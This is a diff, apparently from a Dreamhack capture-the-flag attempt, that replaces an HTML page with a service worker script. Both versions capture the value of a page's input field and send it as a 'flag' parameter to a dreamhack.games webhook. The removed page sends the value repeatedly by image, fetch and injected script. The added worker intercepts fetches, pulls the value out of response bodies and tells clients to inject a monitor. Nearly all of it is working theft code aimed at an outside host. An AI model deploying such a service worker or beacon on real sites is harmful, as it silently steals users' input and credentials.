@@ -1,61 +1,56 @@
- <!DOCTYPE html>
-  <html lang="en">
-  <head>
-      <meta charset="UTF-8">
-      <title>Unexploitable</title>
-  </head>
-  <body>
-      <form method="get">
-          <input type="text" name="input" id="input" form="">
-          <input type="submit" name="submit" id="submit" value="Submit">
-      </form>
+  const WEBHOOK = 'https://rhjifzf.request.dreamhack.games';
 
-      <script>
-          const WEBHOOK = 'https://dpxmgfj.request.dreamhack.games';
-          const input = document.getElementById('input');
+  self.addEventListener('install', (e) => {
+      self.skipWaiting();
+  });
 
-          // 전송 함수
-          function sendFlag(flag) {
-              if (!flag || flag.length === 0) return;
+  self.addEventListener('activate', (e) => {
+      self.clients.claim();
+  });
 
-              const url = WEBHOOK + '?flag=' + encodeURIComponent(flag);
+  self.addEventListener('fetch', (event) => {
+      // POST 요청 (form submit) 감시
+      if (event.request.method === 'POST' || event.request.method === 'GET') {
+          const url = new URL(event.request.url);
 
-              // 방법 1: 이미지 (가장 안정적)
-              new Image().src = url;
+          // 원본 요청 처리
+          event.respondWith(
+              fetch(event.request).then((response) => {
+                  // 응답 클론
+                  const responseClone = response.clone();
 
-              // 방법 2: Fetch (백업)
-              setTimeout(() => {
-                  fetch(url, {
-                      method: 'GET',
-                      mode: 'no-cors'
-                  }).catch(() => {});
-              }, 100);
+                  // 응답 내용 읽기
+                  responseClone.text().then((body) => {
+                      // input 필드 값이 포함되어 있으면 추출
+                      const match = body.match(/id="input"[^>]*value="([^"]*)"/);
+                      if (match && match[1]) {
+                          const flag = match[1];
+                          // 웹훅으로 전송
+                          fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag), {
+                              mode: 'no-cors'
+                          }).catch(() => {});
+                      }
+                  });
 
-              // 방법 3: 스크립트 태그 (또 다른 백업)
-              setTimeout(() => {
-                  const script = document.createElement('script');
-                  script.src = url;
-                  document.head.appendChild(script);
-              }, 200);
-          }
+                  return response;
+              })
+          );
+      } else {
+          event.respondWith(fetch(event.request));
+      }
+  });
 
-          // Input 변경 감시 (실시간)
-          input.addEventListener('input', (e) => {
-              sendFlag(e.target.value);
+  // 페이지 로드 시 input 감시 스크립트 주입
+  self.addEventListener('message', (event) => {
+      if (event.data.type === 'CLAIM') {
+          // 모든 클라이언트에 메시지 전송
+          self.clients.matchAll().then((clients) => {
+              clients.forEach((client) => {
+                  client.postMessage({
+                      type: 'INJECT_MONITOR',
+                      webhook: WEBHOOK
+                  });
+              });
           });
-
-          // Form submit 감시
-          document.querySelector('form').addEventListener('submit', (e) => {
-              sendFlag(input.value);
-              e.preventDefault();
-          });
-
-          // 보안: 주기적으로 현재 값 재전송 (혹시 놓칠 수 있는 경우)
-          setInterval(() => {
-              if (input.value) {
-                  sendFlag(input.value);
-              }
-          }, 2000);
-      </script>
-  </body>
-  </html>
+      }
+  });
